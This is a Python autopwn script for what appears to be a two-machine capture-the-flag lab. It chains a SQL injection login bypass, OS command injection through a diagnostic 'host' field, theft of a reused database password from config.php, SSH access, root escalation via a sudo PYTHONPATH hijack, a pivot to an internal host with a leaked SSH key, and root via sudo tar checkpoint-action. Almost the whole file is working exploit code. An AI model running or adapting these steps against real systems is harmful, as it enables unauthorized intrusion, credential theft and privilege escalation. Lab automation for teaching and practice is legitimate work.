#!/usr/bin/env python3
"""
Observ -- UGC autopwn (full chain, non-interactive).

Automatically exploits the two-machine chain end to end and prints all four
flags. Run from an attacking host (e.g. Kali) that can reach Machine 1 (web);
Machine 2 (internal) is reached by pivoting through M1.

Requires on the attacker: curl, ssh, sshpass, python3 (stdlib only).

Usage:
    ./autopwn.py <M1_HOST> [HTTP_PORT] [SSH_PORT]
    e.g.  ./autopwn.py 192.168.120.50
          ./autopwn.py 127.0.0.1 80 2222

Exits 0 only if all four flags are captured.
"""
import argparse
import base64
import html
import re
import shutil
import subprocess
import sys
import tempfile
import time

C_B, C_G, C_R, C_0 = "\033[1;34m", "\033[1;32m", "\033[1;31m", "\033[0m"


def log(m): print(f"{C_B}[*]{C_0} {m}", flush=True)
def ok(m):  print(f"{C_G}[+]{C_0} {m}", flush=True)
def die(m): print(f"{C_R}[-]{C_0} {m}", file=sys.stderr, flush=True); sys.exit(1)


def sh(cmd, timeout=90):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"


def main():
    ap = argparse.ArgumentParser(description="Observ full-chain autopwn")
    ap.add_argument("host", help="Machine 1 (web) host/IP")
    ap.add_argument("http_port", nargs="?", default="80")
    ap.add_argument("ssh_port", nargs="?", default="22")
    a = ap.parse_args()

    host, hp, sp = a.host, a.http_port, a.ssh_port
    base = f"http://{host}:{hp}"
    dev_user = "developer"
    sqli = "admin' -- -"
    sshopts = ("-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
               "-o ConnectTimeout=10 -o LogLevel=ERROR")

    for tool in ("curl", "ssh", "sshpass"):
        if not shutil.which(tool):
            die(f"missing required tool: {tool}")

    cookie = tempfile.NamedTemporaryFile(prefix="autopwn_", delete=False).name

    # 0. wait for web
    log(f"waiting for web service at {base} ...")
    for i in range(60):
        rc, _, _ = sh(f"curl -s -o /dev/null -m 3 {base}/index.php", timeout=10)
        if rc == 0:
            break
        time.sleep(2)
    else:
        die("web service never came up")

    # 1. SQL injection auth bypass
    log("M1: SQL injection auth bypass on /index.php")
    rc, redir, _ = sh(
        f'curl -s -c {cookie} -o /dev/null -w "%{{redirect_url}}" '
        f'--data-urlencode "username={sqli}" --data-urlencode "password=x" '
        f'{base}/index.php')
    if not redir.strip().endswith("dashboard.php"):
        die(f"SQLi bypass failed (redirect='{redir.strip()}')")
    ok(f"authenticated (redirect -> {redir.strip()})")

    # command execution on M1 as www-data via the injection
    def rce(cmd):
        _, out, _ = sh(
            f'curl -s -b {cookie} --data-urlencode "host=127.0.0.1; {cmd}" '
            f'{base}/monitor/diag.php')
        m = re.search(r"<pre>(.*?)</pre>", out, re.S)
        return html.unescape(m.group(1)) if m else ""

    # 2. OS command injection
    log("M1: OS command injection on /monitor/diag.php")
    if "uid=33(www-data)" not in rce("id"):
        die("command injection failed")
    ok("code execution as www-data")

    # 3. loot config.php -> reused password
    log("M1: reading /var/www/html/config.php for reused credentials")
    out = rce("grep DB_PASS /var/www/html/config.php | head -1")
    m = re.search(r"'([^']+)'", out)
    if not m:
        die("could not extract DB password")
    dev_pass = m.group(1)
    ok(f"recovered reused password: {dev_pass}")

    def ssh_m1(remote):
        b64 = base64.b64encode(remote.encode()).decode()
        return sh(f'sshpass -p "{dev_pass}" ssh {sshopts} -p {sp} '
                  f'{dev_user}@{host} "echo {b64} | base64 -d | bash"')[1]

    log(f"M1: SSH in as {dev_user} using the reused password")
    hn = ssh_m1("hostname").strip()
    if not hn:
        die("ssh as developer failed")
    ok(f"shell as developer@{hn}")

    f_m1_local = (ssh_m1("cat ~/local.txt") or "").strip()
    fm = re.search(r"OS\{[^}]*\}", f_m1_local)
    f_m1_local = fm.group(0) if fm else ""
    if f_m1_local:
        ok(f"M1 local.txt  = {f_m1_local}")

    # 4. privesc on M1: sudo + PYTHONPATH hijack
    log("M1: privilege escalation via sudo PYTHONPATH hijack")
    priv = ('d=$(mktemp -d); '
            'printf "%s" '
            '"import os; os.setuid(0); os.system(\\"cat /root/proof.txt\\")" '
            '> "$d/netcheck.py"; '
            'sudo -n PYTHONPATH="$d" /usr/bin/python3 /opt/health/check.py 2>/dev/null')
    out = ssh_m1(priv)
    fm = re.search(r"OS\{[^}]*\}", out)
    f_m1_proof = fm.group(0) if fm else ""
    if f_m1_proof:
        ok(f"M1 proof.txt  = {f_m1_proof}")

    # 5. pivot: discover internal host + leaked key
    log("pivot: discovering internal host and leaked svc_backup key on M1")
    m2 = (ssh_m1('awk "/HostName/{print \\$2}" ~/.ssh/config 2>/dev/null | head -1')
          or "").strip() or "172.20.0.3"
    if "yes" not in ssh_m1("test -f ~/.ssh/svc_backup_id_ed25519 && echo yes"):
        die("could not locate pivot key on M1")
    ok(f"internal host = {m2}; located svc_backup private key on M1")

    # pivot without ProxyJump: hop via M1, then key-auth to M2 (double base64)
    def ssh_m2(remote):
        inner_b64 = base64.b64encode(remote.encode()).decode()
        rjump = (f"ssh {sshopts} -i ~/.ssh/svc_backup_id_ed25519 "
                 f"svc_backup@{m2} \"echo {inner_b64} | base64 -d | bash\"")
        return ssh_m1(rjump)

    # 6. foothold on M2
    log("M2: SSH foothold as svc_backup (pivoted through M1)")
    hn2 = ssh_m2("hostname").strip()
    if not hn2:
        die("pivot ssh to M2 failed")
    ok(f"shell as svc_backup@{hn2}")

    f_m2_local = ssh_m2("cat ~/local.txt")
    fm = re.search(r"OS\{[^}]*\}", f_m2_local)
    f_m2_local = fm.group(0) if fm else ""
    if f_m2_local:
        ok(f"M2 local.txt  = {f_m2_local}")

    # 7. privesc on M2: sudo tar (GTFOBins)
    log("M2: privilege escalation via sudo tar (GTFOBins)")
    tar = ("sudo -n tar -cf /dev/null /dev/null --checkpoint=1 "
           "--checkpoint-action=exec='cat /root/proof.txt' 2>/dev/null")
    out = ssh_m2(tar)
    fm = re.search(r"OS\{[^}]*\}", out)
    f_m2_proof = fm.group(0) if fm else ""
    if f_m2_proof:
        ok(f"M2 proof.txt  = {f_m2_proof}")

    # summary
    print("\n================ FLAGS ================")
    print(f"M1 local.txt : {f_m1_local or '<MISSING>'}")
    print(f"M1 proof.txt : {f_m1_proof or '<MISSING>'}")
    print(f"M2 local.txt : {f_m2_local or '<MISSING>'}")
    print(f"M2 proof.txt : {f_m2_proof or '<MISSING>'}")
    print("======================================")

    if all((f_m1_local, f_m1_proof, f_m2_local, f_m2_proof)):
        ok("ALL FOUR FLAGS CAPTURED -- full chain owned")
        return 0
    die("one or more flags were not captured")


if __name__ == "__main__":
    sys.exit(main())
